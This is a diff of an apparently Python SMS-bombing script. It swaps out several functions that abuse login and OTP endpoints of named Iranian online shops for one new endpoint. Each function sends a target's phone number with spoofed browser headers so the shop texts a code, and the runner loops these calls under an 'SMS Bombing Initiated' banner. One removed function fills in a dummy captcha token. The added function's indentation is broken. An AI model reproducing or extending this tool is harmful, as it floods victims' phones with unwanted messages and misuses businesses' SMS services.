@@ -47,127 +47,39 @@ def check_internet():
 # SMS services
 # ------------------------------
 
-def angeliran(phone):
+        def khanoumi(phone):
     import requests
-    
-    digits_phone = phone.replace("+98", "")
-    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
-    
-    try:
-        url = "https://angeliran.com/wp-admin/admin-ajax.php"
-        
-        payload = {
-            "digits_phone": formatted_phone,
-            "login_digt_countrycode": "+98",
-            "action_type": "phone",
-            "digits_reg_name": "نام",
-            "digits_process_register": "1",
-            "sms_otp": "",
-            "otp_step_1": "1",
-            "digits_otp_field": "1",
-            "digits": "1",
-            "instance_id": "6f8ca37725ee2166c8fc02c16e17a299",  # instance_id جدید
-            "action": "digits_forms_ajax",
-            "type": "login",
-            "digits_redirect_page": "https://angeliran.com/my-account/",
-            "digits_form": "23837de77d",
-            "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
-            "show_force_title": "1",
-            "container": "digits_protected",  # اضافه شده
-            "sub_action": "sms_otp"  # اضافه شده
-        }
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://angeliran.com",
-            "Referer": "https://angeliran.com/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
-        }
-        
-        response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
-        if response.status_code == 200:
-            response_data = response.json()
-            if response_data.get("success") is True:
-                print(f'{g}(angeliran) {a}Code Sent')
-                return True
-        
-        print(f'{r}[-] (angeliran) Failed{a}')
-        return False
-            
-    except Exception:
-        print(f'{r}[-] (angeliran) Failed{a}')
-        return False
-        
-
-def mahabadperfume(phone):
-    import requests
-    import uuid
     
     formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://mahabadperfume.ir/backend/customer/v2/otp-send/s/"
+    url = "https://accounts.khanoumi.com/api/nim/v1/account/login/init"
     
     payload = {
-        "phone_number": formatted_phone,
-        "is_forget_password": False
+        "phone": formatted_phone
     }
     
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
-        "X-Customer-Signature": str(uuid.uuid4()),  # تولید UUID تصادفی
-        "Origin": "https://mahabadperfume.ir",
-        "Referer": "https://mahabadperfume.ir/",
-        "accept-language": "fa-IR",
+        "Origin": "https://accounts.khanoumi.com",
+        "Referer": "https://accounts.khanoumi.com/",
+        "X-l": "niam"
     }
     
     try:
         response = requests.post(url, json=payload, headers=headers, timeout=10)
         
         if response.status_code == 200:
-            print(f'{g}(mahabadperfume) {a}Code Sent')
+            print(f'{g}(khanoumi) {a}Code Sent')
             return True
         else:
-            print(f'{r}[-] (mahabadperfume) HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] (khanoumi) HTTP Error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f'{r}[!] mahabadperfume Exception: {e}{a}')
+        print(f'{r}[!] khanoumi Exception: {e}{a}')
         return False
 
-
-def theshoes(phone):
-    import requests
-    
-    formatted_phone = "0" + phone.replace("+98", "")
-    url = "https://theshoes.ir/api/v1/sessions/login_request"
-    
-    payload = {
-        "mobile_phone": formatted_phone,
-        "recaptcha_token": "dummy_token"  # توکن اصلی رو باید خودت بگیری
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://theshoes.ir",
-        "Referer": "https://theshoes.ir/",
-    }
-    
-    try:
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        if response.status_code == 200:
-            print(f'{g}(theshoes) {a}Code Sent')
-            return True
-        print(f'{r}[-] (theshoes) HTTP Error: {response.status_code}{a}')
-        return False
-    except Exception as e:
-        print(f'{r}[!] theshoes Exception: {e}{a}')
-        return False
-        
 
 # ------------------------------
 # Safe runner for services
@@ -187,11 +99,8 @@ def send_service_safe(service, phone):
 # ------------------------------
 def Vip(phone, Time):
     services = [
-        theshoes,
-        mahabadperfume,
-        angeliran,
-         
-    ]
+    khanoumi,
+]
     total_services = len(services)
 
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
